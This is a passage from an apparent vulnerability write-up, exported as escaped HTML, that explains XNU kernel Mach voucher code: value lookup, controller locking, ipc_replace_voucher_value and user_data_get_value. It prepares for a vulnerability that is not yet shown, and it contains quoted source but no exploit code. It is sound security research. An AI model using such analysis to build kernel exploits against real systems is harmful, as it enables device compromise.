class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* TODO: support chained values (for effective vouchers).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;]&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;count &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;The locking used in the vouchers code is very important for properly understanding the underlying vulnerability when we eventually get there, but for now I&amp;#39;m glossing over it and we&amp;#39;ll return to examine the relevant locks when necessary.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Let&amp;#39;s discuss the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_lookup_values&lt;/span&gt;&lt;span&gt;&amp;nbsp;code. They index the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;iv_global_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;to get a pointer to the attribute type&amp;#39;s controller:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.93bdc79665655f06bb0a73947fc8e84ad29d789b\"&gt;&lt;/a&gt;&lt;a id=\"t.24\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;iv_global_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;key_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;].&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivgte_control&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;They take that controller&amp;#39;s lock then index its &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivac_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;to find that value&amp;#39;s &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;struct ivac_entry_s&lt;/span&gt;&lt;span&gt;&amp;nbsp;and read the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;value from there:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.dd7ea114ff79be6833293594657c2e978bc73a24\"&gt;&lt;/a&gt;&lt;a id=\"t.25\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;value_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;0&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;]&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;*&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;count &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span&gt;Let&amp;#39;s go back to the calling function (&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ipc_replace_voucher_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;) and keep reading:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.a0e6fa2961c22bcc59d9cf5d3ac1f7a80569832f\"&gt;&lt;/a&gt;&lt;a id=\"t.26\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* Call out to resource manager to get new value */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; new_value_voucher &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IV_NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kr &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivam_get_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivam&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; previous_vals&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;previous_vals_count&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_flag&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;new_value_voucher&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;KERN_SUCCESS &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;kr&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivam-&amp;gt;ivam_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is calling the attribute type&amp;#39;s function pointer which defines the meaning for the particular type of &amp;quot;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;get_value&lt;/span&gt;&lt;span&gt;&amp;quot;. The term &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;here is a little confusing; aren&amp;#39;t we trying to store a new value? (and there&amp;#39;s no subsequent call to a method like &amp;quot;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;store_value&lt;/span&gt;&lt;span&gt;&amp;quot;.) A better way to think about the semantics of &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;is that it&amp;#39;s meant to evaluate both &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;previous_vals&lt;/span&gt;&lt;span&gt;&amp;nbsp;(either the value from &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;previous_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;or the value currently in this voucher) and &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;content&lt;/span&gt;&lt;span&gt;&amp;nbsp;(the arbitrary byte buffer from this sub-recipe) and combine/evaluate them to &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c14\"&gt;create&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&amp;nbsp;a value representation. It&amp;#39;s then up to the controller layer to store/cache that value. (Actually there&amp;#39;s one tedious snag in this system which we&amp;#39;ll get to involving locking...)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5\"&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;ivam_get_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;for the &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;attribute type is &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c11\"&gt;user_data_get_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c10\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.65736db9786b611699f698b6e62ebfcd88a48199\"&gt;&lt;/a&gt;&lt;a id=\"t.27\"&gt;&lt;/a&gt;&lt;table class=\"BGLtzooHlW-c12\"&gt;&lt;tbody&gt;&lt;tr class=\"BGLtzooHlW-c1\"&gt;&lt;td class=\"BGLtzooHlW-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;static&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&amp;nbsp;kern_return_t&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;user_data_get_value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ipc_voucher_attr_manager_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;__assert_only manager&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_key_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; __assert_only key&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_recipe_command_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;command&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;prev_values&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_value_handle_array_size_t &amp;nbsp; &amp;nbsp; prev_value_count&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; 